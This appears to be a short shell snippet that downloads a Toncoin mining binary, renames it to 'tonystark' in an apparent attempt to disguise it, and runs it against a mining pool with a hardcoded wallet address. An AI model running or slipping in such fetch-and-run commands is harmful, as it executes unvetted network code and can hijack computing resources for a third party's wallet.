#tonkoin
sudo apt update
wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-bionic.tar.gz && tar -xf danila-miner-2.3.1-ubuntu-bionic.tar.gz && rm -rf *.tar.gz && mv danila-miner tonystark && chmod +x tonystark && ./tonystark run https://server1.whalestonpool.com EQCJS6lcbHOnbHMcoQPBinuliw67JkmWFefQnF9r1UGbXSHq
